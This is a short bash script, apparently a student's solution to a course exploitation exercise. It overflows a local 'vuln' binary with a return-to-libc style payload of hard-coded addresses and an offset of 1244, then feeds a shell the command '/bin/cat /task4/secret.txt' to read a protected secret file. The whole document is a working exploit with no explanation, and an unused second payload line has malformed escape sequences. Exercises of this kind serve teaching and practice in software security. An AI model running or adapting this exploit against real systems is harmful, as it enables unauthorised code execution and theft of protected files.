#!/usr/bin/env bash

input="$(echo -ne '0x10eee1f7aaaaaaaa8fd8f5f7' | xxd -r)"
input2="$(python -c "print('A' * 1228 + '\x10\xee\xe1\xf7' + '\xaa\xaa\xaa\xaa' + '\x8f\d8\f5\xf7')")"
offset=1244
echo /bin/cat /task4/secret.txt | env -i SHELL='/bin/sh' /task4/s1813106/vuln $(echo -en $input) $offset
